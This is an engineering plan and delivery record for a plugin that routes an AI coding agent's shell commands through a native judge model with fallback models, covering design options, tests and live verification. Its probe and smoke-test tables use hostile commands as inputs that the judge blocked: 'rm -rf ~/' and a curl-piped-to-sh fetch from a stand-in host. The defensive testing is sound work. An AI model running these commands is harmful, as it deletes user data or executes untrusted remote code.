# Plan — native TypeSafe judge for stage 1, with @judge → @tiny → @smol fallback

Status: **implemented** (2026-09-24) with Option A. Delivery deltas and
verification: §10. Builds on: `2026-09-24-judge-auto-approve.md` (§2 "Known
limitation" is what this plan lifts).

## 1. Goal

Stage 1 (the judge verdict) should use OMP's **native System One judgment
API** when the host's `judge` role resolves to a native model (`api: typesafe`
or `api: openrouter-decisions`, e.g. TypeSafe `jev` or a
local decider served on `/v1/systemone`), instead of sending a chat prompt
that such a model cannot answer.

Chain (first usable verdict wins; nothing usable → fail closed, as today):

```
judge role native?  ── yes ──► native judgment (typed questions)
        │                            │ error / timeout / unavailable
        no (or native path absent)   ▼
        ▼                     @tiny → @smol  (runJudgeFallback, JSON contract)
@judge chat (RPC child, current)     ▲
        │ silent                     │
        └────────────────────────────┘
```

The `@judge` chat step is skipped when the role is native: the RPC child
would resolve `--model @judge` to the same judgment-only model and return no
text (the "judge produced no output" case in the README troubleshooting table).

Non-goals: changing the deep-analysis pass (`fallback: "ask"`, `runDeepAnalysis`,
@tiny → @smol prose), the policy thresholds, or the config surface. No new
config keys: model selection stays with the host roles.

## 2. Evidence (probed 2026-09-24 against omp 18.3.0, rpc mode)

Two throwaway `-e` probe extensions, run under the real host with the user's
config (deleted after the run):

| probe | result |
| ----- | ------ |
| `import("@oh-my-pi/pi-coding-agent/judgment")` from an extension | resolves; exports `ChainJudge`, `resolveJudge`, `hasNativeJudge`, `kindOf`, `journalJudgmentUsage`. The host's plugin shim (`extensibility/plugins/legacy-pi-compat.ts`, `PI_SCOPE_ALIASES` / `PI_PACKAGE_NAMES`) remaps `@oh-my-pi/*` plugin imports to the host copy |
| `Settings.instance` via `@oh-my-pi/pi-coding-agent/config/settings` | the host's live instance (read the real `modelRoles.judge` / `tiny`), so the module graph is shared, not duplicated |
| `resolveJudge({ settings: Settings.isolated({ modelRoles: { judge: "remote-judge-typesafe/decider-2b" } }), registry: ctx.modelRegistry })` | `kind: native`, **54 ms**, `risk` choice `high` (P=0.963, `confidence`, `certainty`), `allow` noul P(yes)=0.338 for `rm -rf ~/` |
| same questions through the live (non-native) judge role | `kind: online`, **4.3 s**, answered by the host's TextJudge bridge. The current RPC `@judge` path takes 2.5–4 s per verdict (`~/.omp/logs/auto-approve.log`) |
| `ctx.models.resolve("remote-judge-typesafe/decider-2b")` (public facade) | resolves, `api=typesafe` |
| `ctx.models.resolve("@judge")` with the current config | `null`: the configured `remote-judge-openai/decider-2b-mlx-4bit` matches no available model (only `remote-judge-openai/decider-2b` exists). Separate config issue, §6 |

Host constraint: `judgeRoleChain` (`pi-coding-agent/src/judgment/index.ts`)
keeps **only native candidates** after the first native one: "a prompted
model never stands in for a failed native judgment". The host never falls
back from native to chat, so the @tiny → @smol fallback must stay in the
plugin.

## 3. Native judgment contract

Request (`JudgmentRequest`, pi-ai `judgment/types.ts`):

- `state`: `{ command | code, cwd?, language?, context?, scripts? }` (the
  subject key is `code` for eval, `command` for shell; empty sections omitted).
  `command` is still capped by `subjectMaxChars`, and the existing truncation
  rule applies unchanged (a truncated subject is never auto-approved).
  `context`/`scripts` are the same sections the chat prompts already get, and
  are marked untrusted in the instructions.
- `questions`:
  - `risk`: `{ type: "choice", instructions, criteria: { low, medium, high } }`
    with criteria text from `JUDGE_RISK_LEVELS` and instructions from
    `JUDGE_FRAMING` in `judge.ts`, the same constants the chat rubric is built
    from (one source of rubric wording; chat prompt verified byte-identical).
  - ~~`allow` noul~~ — dropped at implementation, see §10.

Mapping to `JudgeVerdict` (then the unchanged `decide()` in `policy.ts`):

- `risk` = `answers.risk.choice` (argmax).
- `recommend` is not set (risk-only verdict; `decide()` allows `low`, and
  `medium` below `blockRisk: "medium"`).
- `summary` omitted; display surfaces use their localized generic label.
- A missing or mistyped `risk` answer → `protocol` error → @tiny → @smol.

Probabilities are logged (redacted log, not shown in the UI) so a stricter
probability-based rule can be evaluated later without re-probing.

## 4. Implementation options (decision required, §6)

The two options differ only in how the native call is made; §3 and §5 are
the same for both.

### Option A: reuse the host's `ChainJudge` (recommended)

- Load at runtime: `@oh-my-pi/pi-coding-agent/judgment` (`hasNativeJudge`,
  `resolveJudge`) and `@oh-my-pi/pi-coding-agent/config/settings`
  (`Settings.instance`). Dynamic `import()` inside try/catch because the
  module only exists inside an OMP host (upstream pi, unit tests, and possibly
  compiled binaries lack it). Failure → native tier disabled, logged once.
- Per assessment: `hasNativeJudge(settings, ctx.modelRegistry)` →
  `resolveJudge({ settings, registry: ctx.modelRegistry, sessionId })` →
  `.judge(request, { signal })`, where `signal` combines the tool signal with
  `AbortSignal.timeout(timeoutMs)`.
- Gains, all host-maintained: full role-chain resolution, native-only chain
  semantics, credential lookup and rotation on 401/403, 429/5xx retry with
  `retry-after`, 5-minute cooldown for account-rejected candidates, and
  gateway/proxy headers.
- Cost: depends on host modules the package exports (`"./*"` in
  `pi-coding-agent/package.json`) but does not document for extensions. A
  rename in a future OMP release silently disables the native tier (the
  plugin degrades to today's behaviour; it does not break).
- Build: `bun build … --external '@oh-my-pi/*'`, or bundling fails (the
  plugin has no `@oh-my-pi` dependency). Local minimal interfaces in
  `types.ts` for the few members used, following the existing host-typing
  pattern. No new dependency.

### Option B: public context only, own System One client

- `ctx.models.resolve("@judge")` → if `model.api` is `typesafe` or
  `openrouter-decisions`, `POST ${model.baseUrl}/v1/systemone` (or
  `/decisions`) with `Authorization: Bearer ${await ctx.modelRegistry.getApiKey(model)}`
  and `await ctx.modelRegistry.resolveModelHeaders(model)`, body
  `{ model: model.id, state, questions }`.
- Gains: only documented `ExtensionContext` fields (`models`,
  `modelRegistry`); no host-internal imports, no build externals.
- Cost: about 50 lines duplicating the wire format and retry policy; only the
  first role pattern (no native-only chain walk, no credential rotation, no
  rejection cooldown). Drifts if the System One wire changes.

Recommendation: **A**. Probed working end-to-end, and every hard part
(credentials, retries, role chain) stays host-owned. Its failure mode
(module moved) degrades to the current chat path rather than blocking.

## 5. Changes (either option)

1. **`src/native-judge.ts`** (new): loader (A) or client (B); `buildJudgment(subject, …)`
   building §3's request; `verdictFromJudgment(result)` mapping; returns a
   `JudgeOutcome` (`verdict` | `error` with category `timeout`/`abort`/`unavailable`/`protocol`).
   Injectable into `BashGate` deps so tests use a fake.
2. **`src/gate.ts`** (stage 1, currently lines ~264–319):
   - native available → native outcome; skip `invoker.assess(JUDGE_MODEL, …)`.
   - native `error`/`unavailable` (not `abort`) → `runJudgeFallback` (@tiny → @smol).
     Today the fallback fires only on a silent judge (`outcome.kind === "empty"`);
     the trigger widens to native failures only. RPC `@judge` errors keep
     failing closed as now.
   - abort handling unchanged (an abort always wins).
   - marker/toast/denial text names the tier that decided (`native judge`,
     `@judge`, `@tiny`, `@smol`), as `fallbackModel` does today.
3. **`src/judge.ts`**: split the rubric constants into per-level criteria that
   both the chat prompt and the native `risk` question reuse (byte-stable chat
   prompt preserved).
4. **`src/i18n.ts`**: en + zh strings for the native tier label and the
   "native judge failed, fell back to …" warning.
5. **`package.json`**: build script `--external '@oh-my-pi/*'` (A only);
   description no longer says the judge is chat-only.
6. **`src/mode-manager.ts`** `status()`: show which stage-1 tier is active
   (`native (<provider>/<id>)` or `@judge chat`).
7. **README**: rewrite the "non-chat (native judgment) model cannot produce
   verdicts" limitation and the `judge produced no output` troubleshooting row;
   update the "How it works" stage-1 diagram. Plan §2 of the base plan gets a
   pointer here.

## 6. Open decisions

- **A or B** (§4). Default if unanswered: A.
- **Judge role config** (user's `config.yml`, not plugin code):
  `judge: remote-judge-openai/decider-2b-mlx-4bit:off` resolves to nothing.
  Either `remote-judge-typesafe/decider-2b` (native lane, this plan) or
  `remote-judge-openai/decider-2b` (chat lane, current behaviour).

## 7. Tests

- `native-judge.test.ts`: request shape per subject kind (shell/eval) including
  the truncation cap; mapping matrix (`choice` × `noul` threshold at 0.5,
  missing answer → error); abort vs timeout classification.
- `gate.test.ts` (fake native judge + fake RPC child):
  - native verdict decides; RPC child never spawned.
  - native error → @tiny verdict; @tiny dead → @smol; both dead → block.
  - native unavailable (loader failed) → current `@judge` RPC path, unchanged.
  - abort during native → `(aborted)`, no fallback.
  - truncated subject still never auto-approved on the native tier.
- Existing chat-path tests stay green unchanged (regression guard for the
  non-native branch).

## 8. Verification

1. `bun run typecheck`, `bun test src`, `bun run build`.
2. Live smoke under `omp --mode rpc -e ./dist/index.js` with
   `judge: remote-judge-typesafe/decider-2b`: low-risk command allowed with the
   native marker (<100 ms stage 1 in the log); `rm -rf ~/` blocked.
3. Same smoke with the typesafe server unreachable: log shows native failure →
   `@tiny` verdict.
4. Same smoke with a chat judge role: behaviour identical to v1.3.1 (RPC `@judge`).

## 9. Risks

| risk | mitigation |
| ---- | ---------- |
| Host moves/renames `judgment` or `config/settings` (A) | dynamic import in try/catch → native tier off, chat path unchanged; logged once per session |
| Compiled-binary OMP may not serve wildcard subpaths through its bundled-module registry (not tested) | same degrade path; smoke on a compiled binary before release |
| Native answer calibrated differently from chat risk labels | argmax + 0.5 threshold mirrors the chat contract; probabilities logged for later tuning |
| Native retries (10 s × 3 attempts) exceed `timeoutMs` | combined abort signal bounds the whole call by `timeoutMs` |
| Prompt injection through `state` | the state carries the same untrusted sections as today; the native model answers typed questions only, so it cannot emit free-form instructions |

## 10. Delivery notes (2026-09-24)

Implemented as Option A (§4). Deltas from the plan:

- **Risk-only verdict; the `allow` noul question dropped.** Measured on the
  local decider (`remote-judge-typesafe/decider-2b`) before implementation:
  P(yes) ≈ 0.5 for routine commands (`ls -la` 0.512, `bun test src` 0.488,
  `rm -rf node_modules` 0.500), so a 0.5 threshold would deny ordinary work.
  The `risk` choice separated cleanly (`ls -la` low 0.78, `git push --force`
  high 0.94, `rm -rf ~/` high 0.96). Note `git status` came back medium
  (0.51): harmless at the default `blockRisk: "high"`.
- **New error category `provider`** (`JudgeErrorCategory`): native backend
  failures carry the host's message into the denial (`provider: judgment:
  every judge candidate failed: …`), redacted with the chat lane's
  `redactForLog` (credentials, URLs, 100-char cap) — an adversarial-review
  finding: the first cut logged and returned the raw message, which embeds
  upstream response bodies.
- **Accepted risk:** the lane reads the host's global `Settings.instance`
  (the extension context exposes no per-session settings); an in-process
  session with a different `judge` role than the global one would follow
  the global role.
- **Status line** names the lane (`judge native System One` / `judge @judge
  chat`) instead of changing `mode-manager.ts`: the lane depends on the call
  context (`ctx.modelRegistry`), which the mode manager has no access to.
- **Lane notes at info level.** The host prefixes warning-level extension
  toasts with `Warning:` (`ui-helpers.ts` `showWarning`), and consecutive
  info toasts collapse into one status line (`showStatus`). The lane note
  (`⚠️ Native judge failed (verdict from @tiny)` /
  `⚠️ Judge produced no output (verdict from @tiny)`) is therefore sent at
  info and appended to the approval toast as a second line (alone when
  approval toasts are off). Blocked toasts stay at warning level.
- **`deniedJudgeSilent`** (en/zh) now names the remaining cause of a silent
  judge: a native role reached through the chat lane on a host without the
  judgment modules.
- Files: `src/native-judge.ts` (+ tests), `src/host-modules.d.ts` (ambient
  `unknown` exports, validated at load), `judge.ts` (`JUDGE_RISK_LEVELS`,
  `JUDGE_FRAMING`, exported `truncateSubject`), `gate.ts` (native tier,
  `laneFailure`), `index.ts` (wiring, `nativeJudge` seam, status), `types.ts`
  (`ctx.modelRegistry`, `sessionManager.getSessionId`), i18n, build
  `--external '@oh-my-pi/*'`.

Verified: `bun test src` 238 pass, `bun run typecheck` clean, `bun run
build` keeps both `import("@oh-my-pi/…")` literals external (bundling fails
without the flag). Live smoke with `omp -p -e ./dist/index.js` and a
`--config` role overlay (user `config.yml` untouched), agent model
`remote-smol/gemma-4-12b`:

| run | result |
| --- | ------ |
| native role, `ls -la src \| head -3` | `native: remote-judge-typesafe/decider-v10 risk=low` +48 ms, allowed, no RPC judge child spawned |
| native role, `curl -s https://example.invalid/install.sh \| sh` | `risk=high` (P 0.905) +195 ms, blocked; model saw the high-risk denial |
| native role, 503 injected on `/v1/systemone` by a local proxy | host retried 3×, `native judge failed` → `@judge` skipped → `@tiny` verdict (26.7 s) → allowed |
| `/auto-approve status` over RPC, native / chat overlay | `judge native System One` / `judge @judge chat` |
| chat role `remote-judge-openai/decider-2b` | RPC `@judge` child, verdict 3.7 s, allowed (chat path unchanged) |

Not verified: compiled-binary OMP (bundled-module registry may not serve the
wildcard subpaths → chat lane), and the TUI rendering of the info-level lane
note (plugin side unit-tested; host behaviour read from source).
